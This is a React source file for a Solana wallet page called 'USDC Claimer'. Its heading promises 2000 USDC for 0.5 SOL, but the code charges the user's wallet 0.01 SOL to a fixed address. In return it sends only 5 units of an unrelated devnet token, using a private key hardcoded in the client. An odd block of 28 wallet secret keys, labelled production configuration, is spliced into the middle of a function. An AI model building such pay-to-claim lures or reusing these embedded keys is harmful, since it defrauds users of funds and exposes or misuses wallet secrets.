/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5BVPZc3dpFFNyjWstVGWTEaAoYTS94nZd69U3wD9oYG8DumZDiFmCQU6quXjzQVfXPLSvJUxSPE6getd3A2oGMRz"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3YZBzMNr8Ma2ywnYzQAnEG4NronqUWTJZiADD74pGiNtPi1QMeSpXTX9izdEbu2DDY7sxJV5jKw3tcW1vHHivHJu",
  "key1": "ZhDJFaXiAxRXoUJw9S1RNcVhwa4PiU95r8u6KdwMDk2b9vhbHuAzSCPiSbEgA3R9xyzFABNffAFxzhwPCB6QV4g",
  "key2": "4264mZNkVAcVERfo9XMg4fjMX2W7mHYe1dwAB8EMHDJ9mLgWosnUjPP7rV5pYBTsKAnu3ERFhgvVPwygaBXDjrai",
  "key3": "5bb72Go24gup3nB15i4yxmaZskTdXiqJTrxtFcdCgmWACUrT4o6cfZPxpExBn4qFua25gK3tGgt9aqhpHHkFpTEK",
  "key4": "UALDyoh668AKG5Mu8icUP9XgJiPGLuEyvTdirV4rY635YNkRvri3fhL3tN1uiR7zZHoxXXK4ffLjXkJaEatfdYa",
  "key5": "3XxBnhQJPQSQcPeMLuKC3KVz7HJ4xvV89t3ECEpuRbEUqvicuaEaoizVyC8refMvfdQrcarRZH6ZZUP8FnRVKMke",
  "key6": "4iENAt4p9tcTXpwb7pH3ZRPqq4YqjVAi4Hi3AS2pVyYzKwrC3KenhcpVhT41C9CLHr6ab4D7ju9Xn98GMBCuhbKK",
  "key7": "C4n45Y3uqwg7WBujpyeRqJvxLwEkYpwYCNZKcPah9k3j93o8yYPH4jCXFPtwq4qjiRLgn5EQBok7Po9twRLXdET",
  "key8": "5dmAtKKhraHAdPEJ8UPZHBeqs8ntUwxKswctKNhBK4QyAMfdx5Vwx3HMbjLsSZiZFiiiqrfWNs7nyG6Fkdiy171D",
  "key9": "2B2zKBMzQekM5A2g4cmgYipgeSAJfnvDkeYVoQ3KDvK4sMq6pKUUnEWLPGJoEXs9Ztx4upqwtJPTF1xF7P18uvwJ",
  "key10": "48rpWWBYvaE8CHhbShTUwhZPvY9gB641T6espnXDyRVXUTpQ5Ra2wVtuoWy9EDjAf5gce4KDZPwqZutbGLYgLuAE",
  "key11": "2c4vj237L98KHxewvBKfswYDoeYnGUqZEoL3tcZUdwUqKDcHt6updHTWEwSLBuwQxtTX3eMdmcPnfKFd5csznas",
  "key12": "5DAAjrqg3FMY9QsWFKT4YZbzy1vaJF9tVUrWEwK5ESjzDwZCzKj716raa8Vi49x8H9vheNa5hvDY1g1kG2ATRLH",
  "key13": "3GShWZJBtPSyrmzhU5XN9v5WhTPpEym1YembBJe9b9yFhHtvcgtwY9gVowPAmajHq6tmdiPrU5XKdJBhzFs2dm6V",
  "key14": "4xwy1R8ZGB5Pkj179ogLUJEKudWrnFdCPfQhkfQCHXppn8PUHf1VPYFXHaoKCxVuhHQGKXby7NoRBJpb8eYCi8w5",
  "key15": "F7Gm7n9HueudYcxHKSj3ErTuKimxUU9umfXJVYzLnMYNziF9F9WMsJ7ZqHYj168Dss4sG8m7u3ckub1e9fGPZLr",
  "key16": "5TKJQH3cG4qKT1uGU2NaAaHKCHwUWRRwo7UyyoeJy7enTr1TAnQFui3kjLzaFHG9WTrSjBxbbQpZBgySRnCUHfCF",
  "key17": "pMmPc9381qu3iToBtHHuJs9pktK2v9jWk4DGNqrR1F2TgkuzQk62t6mkmkGzE2oYuBipB1TvTg4MG5zwoj2DoUm",
  "key18": "4NxfEBKptq6rAvvve5TyuCEzF1KDBMdvgzAVDp5XUMCuN4X8A3aZSxuAJDsT9uhcrTrazNrBKz7viG6BCASz14HM",
  "key19": "42gZys4ckLaiBVVyhFJZircehDEu3RcrCUHr832ZbMzr2g7cG9KA9VA9py5t9ctRGSKWU3LH3zmy6MstHYTevc7o",
  "key20": "5Wm7xKVNAbnHhj1FuASxQM4DqAUoVyfkReik8NCMg3shxJuqMATtGYRr2LBRqpksUjdvkV8HPepmbyPYv88zDaBs",
  "key21": "4GHmeQuz6qZbASMQnu7G1i3ht6Zc6Py4Nd1aRXei7riHapxYbVWB5uHpDGbPC3r3H1BVbtFCAZ29J5bEmDyQsusT",
  "key22": "3NmbPmZd5je4UWFkZtcXFDAJ42qaKTtQBYznXz2j4VgGn8BF57HPHa11PVE6SoJJBSTDgbxCyPdfNVMVw3632eyU",
  "key23": "4j9ehuRAn12SckQhPiRm3JwtFbjMrpax5ieigt1A7yvfrZQhewPEoR2sPfjPG8cjW1ive9Df7zeZvitMhzf5Gsgz",
  "key24": "3UQh7p1WnFhHTTtYh18WqXdQU8pjuSPe1wfDtLfTjuE8xx6QVXgtXc2Nw3xSa8jJVYz9kgLpb5qecMfb8t8m2aVF",
  "key25": "37Xt93QknYDUQKt8wcaweBag1HSDxzgcRTtPr27mM3GiuxfeeftAn78z5KX2ytp1ujzBbGnYzdE7UnRASEzrUnhj",
  "key26": "23EYoX9dMwEr377utNtWGz9cqy71M59pxspCqXmG6N9EdPzBbeZJYNkP86EDciXA6EGWrneJN79WRnN7Zrzj2Fef",
  "key27": "5cxNaorbrEui3XuT4NtxW7mGrvHHqr5GSSuA2LUnNuh3RzfvwxzNe7vH66hS7ihKjhzwAhsPLRu31Qsg5Q2R6caX"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
